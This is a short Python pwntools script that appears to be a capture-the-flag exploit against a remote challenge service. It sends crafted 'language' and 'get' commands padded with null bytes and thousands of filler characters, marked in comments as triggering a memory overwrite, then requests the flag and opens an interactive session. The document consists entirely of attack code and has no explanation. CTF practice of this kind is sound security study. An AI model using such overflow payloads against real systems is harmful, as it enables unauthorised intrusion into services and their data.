from pwn import *
import random
import string
import binascii


debug = True

def debug_print(data):
  if debug:
    print data

context(os="linux", arch="amd64")
#p = process(["launch","./public/"])
p = remote("cthulhu.fluxfingers.net", 1509)
log.info("Doing stuff")

addr = 0x400D95
gdb_str = ''
gdb_str += 'b *' +hex(addr) + '\n'
gdb_str += 'c'

p.sendline("")
p.sendline("language" + "\x00" + "A"*0x1000)
debug_print( p.recv() )
p.sendline("B"*100 + "\x00" )

#trigger overwrite
p.sendline("language" + "\x00" + "\x0c"*0x6000)
p.sendline("B"*20 + "\x00" )

#trigger overwrite
p.sendline("get" + "\x00" + "/"*0x3fff)
debug_print( p.recv() )
p.sendline("flag" + "\x00" + "\x0d"*0x80)

p.interactive()
